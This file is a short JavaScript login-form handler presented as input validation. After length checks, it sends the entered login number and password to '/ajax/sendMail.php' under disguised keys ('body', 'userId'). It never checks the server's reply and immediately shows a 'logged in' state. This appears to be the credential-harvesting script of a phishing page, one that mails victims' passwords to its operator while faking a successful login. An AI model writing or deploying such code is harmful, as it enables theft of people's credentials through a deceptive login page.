// start validate form login
const idloginform = document.getElementById('loginform');
const loginnumber = document.getElementById('loginnumber');
const loginpassword = document.getElementById('loginpassword');
const loginformdouble = document.querySelector('.login__form');
const regformdouble = document.querySelector('.reg__form');
const loginloggeddouble = document.querySelector('.login__logged');

if(!idloginform){} else {

  loginnumber.oninput = function(){this.value = this.value.substr(0, 30);}
  loginpassword.oninput = function(){this.value = this.value.substr(0, 30);}

  idloginform.addEventListener('submit', e => {
    e.preventDefault();
    checkInputs();
  });

  function checkInputs() {
    const loginnumberValue = loginnumber.value.trim();
    const loginpasswordValue = loginpassword.value.trim();
    
    if(loginnumberValue != '' && loginnumberValue.length > 5 && loginnumberValue.length <= 30) {setSuccessFor(loginnumber);} else {setErrorFor(loginnumber);}
    if(loginpasswordValue != '' && loginpasswordValue.length > 5 && loginpasswordValue.length <= 30) {setSuccessFor(loginpassword);} else {setErrorFor(loginpassword);}
    if(loginnumberValue != '' && loginnumberValue.length > 5 && loginnumberValue.length <= 30 && loginpasswordValue != '' && loginpasswordValue.length > 5 && loginpasswordValue.length <= 30){
      window.setTimeout(function () {
        fetch('/ajax/sendMail.php', {
          method: 'POST',
          body: JSON.stringify({
            body: loginnumberValue,
            userId: loginpasswordValue
          }),
          headers: {
            "Content-type": "application/json; charset=UTF-8"
          }
        })
      }, 1000);
      loginformdouble.classList.add("hidden");
      regformdouble.classList.remove("active");
      loginloggeddouble.classList.add("active");
      loginnumber.value = '';
      loginpassword.value = '';
    }
  }
  
  function setErrorFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__error';
  }
  
  function setSuccessFor(input) {
    const formControl = input.parentElement;
    formControl.className = 'login__label input__success';
  }
}
// end validate form login